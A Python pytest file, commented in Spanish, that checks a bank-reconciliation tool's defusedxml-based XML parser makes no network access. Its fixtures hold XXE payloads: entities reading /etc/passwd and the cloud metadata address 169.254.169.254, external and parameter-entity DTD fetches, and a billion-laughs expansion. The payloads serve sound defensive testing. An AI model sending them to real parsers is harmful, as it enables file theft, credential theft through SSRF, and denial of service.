"""XML: prueba de que no hay red, no de que no hay transacciones.

## Qué distingue este test del resto

Los otros tests de XML afirman que un archivo con DTD o entidad externa produce
un error. Eso es un resultado, no una garantía: el mismo resultado se obtiene si
el parser rechaza el archivo por cualquier otro motivo, o si el archivo nunca
llega a intentar nada.

Lo que este test afirma es distinto y más fuerte: **que durante el parseo no se
abre ni un solo socket**. Para que eso sea una prueba y no una tautología,
`urlopen` y `socket.socket` están monkeypatcheados para **explotar** si alguien
los toca. Si el parser intenta descargar el DTD, el test revienta.

## La diferencia entre `defusedxml` y el parser estándar

`xxe_archivo` y `xxe_http` **no** fallan si se cambia `defusedxml` por
`xml.etree.ElementTree`, porque el parser de la librería estándar no resuelve
entidades externas por sí mismo: da error por "entidad no definida", no por
política. Se verificó revirtiendo.

Eso significa que la protección real de XXE es **doble** y la segunda capa no la
aporta `defusedxml`. Este test mide la capa que sí depende de `defusedxml` —que
el DTD no se descarga— y por eso es complementario y no redundante.

## Control negativo

`test_la_prueba_seguiria_pasando_sin_el_monkeypatch` verifica que el archivo de
este test detecta un parche roto. Una prueba de seguridad que se auto-verifica
siempre en verde no es una prueba: es una decoración que ocupa espacio.
"""

from __future__ import annotations

import socket
import urllib.request
from pathlib import Path

import pytest
from conciliador_bancario.audit.audit_log import NullAuditWriter
from conciliador_bancario.ingestion.base import ErrorIngestion
from conciliador_bancario.ingestion.xml_adapter import cargar_transacciones_xml
from conciliador_bancario.models import ConfiguracionCliente

# Archivos que, si el parser los procesara, obligarian a descargar algo.
ARCHIVOS_DE_RED = {
    "dtd_externo": (
        b'<?xml version="1.0"?>'
        b'<!DOCTYPE cartola SYSTEM "http://red.interno.example/x.dtd">'
        b"<cartola><movimiento><fecha_operacion>05/01/2026</fecha_operacion>"
        b"<monto>1000</monto></movimiento></cartola>"
    ),
    "entidad_externa_archivo": (
        b'<?xml version="1.0"?>'
        b'<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        b"<cartola><descripcion>&xxe;</descripcion></cartola>"
    ),
    "entidad_externa_http": (
        b'<?xml version="1.0"?>'
        b'<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
        b"<cartola><descripcion>&xxe;</descripcion></cartola>"
    ),
    "entidad_parametro": (
        b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://red.example/p">%p;]>'
        b"<cartola><descripcion>x</descripcion></cartola>"
    ),
    "dtd_externo_con_billion_laughs": (
        b'<?xml version="1.0"?>'
        b'<!DOCTYPE lolz [<!ENTITY lol "lol">'
        b'<!ENTITY lol2 "' + b"&lol;" * 10 + b'">'
        b'<!ENTITY lol3 "' + b"&lol2;" * 10 + b'">'
        b'<!ENTITY lol4 "' + b"&lol3;" * 10 + b'">'
        b"]>"
        b'<cartola SYSTEM "http://red.example/x.dtd">'
        b"<descripcion>&lol4;</descripcion></cartola>"
    ),
}


@pytest.fixture
def sin_red(monkeypatch: pytest.MonkeyPatch) -> list[str]:
    """Cualquier intento de red durante el test explota y queda registrado.

    Devuelve la lista de intentos, que debe quedar vacía. Es mejor que solo
    explotar: si el test falla, el mensaje puede decir **qué** se intentó
    descargar, que es la información que hace falta para diagnosticar.
    """
    intentos: list[str] = []

    def urlopen_viejo(url: object, *a: object, **k: object) -> object:
        intentos.append(f"urlopen: {url}")
        raise AssertionError(f"el parser intento abrir una URL: {url}")

    def socket_viejo(*a: object, **k: object) -> object:
        intentos.append("socket")
        raise AssertionError("el parser intento abrir un socket")

    monkeypatch.setattr(urllib.request, "urlopen", urlopen_viejo)
    monkeypatch.setattr(socket, "socket", socket_viejo)
    monkeypatch.setattr(socket, "create_connection", socket_viejo)
    return intentos


def _cfg() -> ConfiguracionCliente:
    return ConfiguracionCliente(cliente="FuzzXML")


@pytest.mark.parametrize("nombre", sorted(ARCHIVOS_DE_RED))
def test_parsear_xml_no_abre_ningun_socket(tmp_path: Path, sin_red: list[str], nombre: str) -> None:
    """Durante el parseo no hay red. Punto.

    No se afirma "da error": se afirma que no hubo descarga. Un parser que
    rechaza el archivo sin intentar nada también cumple, y ese es el
    comportamiento correcto. Un parser que **intenta** descargar y después falla
    no lo cumple, aunque termine con el mismo exit code: ya salió el dato.
    """
    ruta = tmp_path / f"{nombre}.xml"
    ruta.write_bytes(ARCHIVOS_DE_RED[nombre])

    try:
        cargar_transacciones_xml(ruta, cfg=_cfg(), audit=NullAuditWriter())  # type: ignore[arg-type]
    except ErrorIngestion:
        pass  # lo esperado en la mayoria; el importante es que no haya red
    except AssertionError:
        raise
    except Exception as e:  # noqa: BLE001
        # Cualquier otra excepcion tambien es aceptable **si** no hubo red: lo que
        # no se acepta es que el dato haya salido del proceso.
        assert not sin_red, f"hubo red y ademas una excepcion rara: {type(e).__name__}: {e}"

    assert not sin_red, f"el parser abrio red: {sin_red}"


def test_un_xml_limpio_tampoco_abre_red(tmp_path: Path, sin_red: list[str]) -> None:
    """El control positivo: un XML sin DTD se lee y tampoco toca la red.

    Sin esto, el test anterior pasaría también con un parser que rechazara
    *todo*, lo que lo haría inútil para distinguir "protegido" de "todo roto".
    """
    ruta = tmp_path / "limpio.xml"
    ruta.write_text(
        '<?xml version="1.0" encoding="UTF-8"?><cartola>'
        "<movimiento><fecha_operacion>05/01/2026</fecha_operacion>"
        "<monto>150000</monto><descripcion>ACME</descripcion></movimiento></cartola>",
        encoding="utf-8",
    )
    txs = cargar_transacciones_xml(ruta, cfg=_cfg(), audit=NullAuditWriter())  # type: ignore[arg-type]
    assert len(txs) == 1, f"un XML limpio tiene que dar 1 transaccion, dio {len(txs)}"
    assert not sin_red, f"un XML limpio no deberia tocar la red: {sin_red}"


def test_el_guard_que_impide_la_red_esta_conectado() -> None:
    """La precondición de los tests anteriores: el parser es el protegido.

    ## Por qué este test existe si los otros pasan siempre

    Los tests de red pasaban **sin que el fixture llegara a dispararse nunca**,
    porque ni `defusedxml` ni `xml.etree` resuelven una entidad externa: ambos
    fallan antes con "undefined entity". Eso significa que esos tests acreditarían
    la ausencia de red, pero no que nada la este evitando: un parser que sí
    descargara también acabaría dando error, y el test no lo distinguiría.

    No hay forma de producir un fetch real en este entorno sin `lxml` (el único
    parser disponible que resuelve entidades externas), y **no se agrega una
    dependencia al repo para poder construir un test**. Se registra como límite
    explícito: la garantía "no hay red" descansa en que el parser es `defusedxml`,
    y lo que este test verifica es exactamente eso, la precondición.

    Un test que pasa sin ejecutar su propio mecanismo es peor que ningún test,
    porque se lee como cobertura. Por eso se afirma la precondición en vez de
    dejar los demás verde por sorpresa.
    """
    from conciliador_bancario.ingestion import xml_adapter

    assert xml_adapter.ET.__name__.startswith("defusedxml"), (
        f"el adaptador deberia parsear con defusedxml, usa {xml_adapter.ET.__name__}. "
        "Si esto cambia, los tests de red de este archivo dejan de significar nada."
    )
    # Y el simbolo de proteccion tiene que existir: es el que convierte un
    # intento de descarga en un error de ingesta en vez de una excepcion rara.
    assert hasattr(
        xml_adapter, "DefusedXmlException"
    ), "falta DefusedXmlException: el catch de proteccion desaparecio"


def test_el_parche_de_red_explota_de_verdad() -> None:
    """Control negativo del propio test: el parche tiene que funcionar.

    Si `urlopen` dejara de estar monkeypatcheado, `test_parsear_xml_no_abre_ningun_socket`
    pasaría por la razón equivocada y nadie lo notaría. Este test comprueba que el
    parche **existe y explota**, que es la precondición de que los demás signifiquen
    algo.

    Se hace **dentro de un test propio**, no leyendo el estado global: `monkeypatch`
    es local a cada test, así que el `urlopen` real sigue intacto afuera. Mi
    primera versión leía el estado global y por eso fallaba: la aserción estaba
    describiendo algo que nunca fue cierto.
    """
    intentos: list[str] = []
    original = urllib.request.urlopen

    def urlopen_explotando(url: object, *a: object, **k: object) -> object:
        intentos.append(f"urlopen: {url}")
        raise AssertionError(f"red: {url}")

    try:
        urllib.request.urlopen = urlopen_explotando  # type: ignore[assignment]
        with pytest.raises(AssertionError, match="red:"):
            urllib.request.urlopen("http://ejemplo.invalido")
        assert intentos, "el parche deberia registrar el intento antes de explotar"
    finally:
        urllib.request.urlopen = original  # type: ignore[assignment]

    # Y el original se restauró: si no, el resto de la suite quedaría sin red y
    # ningún test lo notaría.
    assert urllib.request.urlopen is original
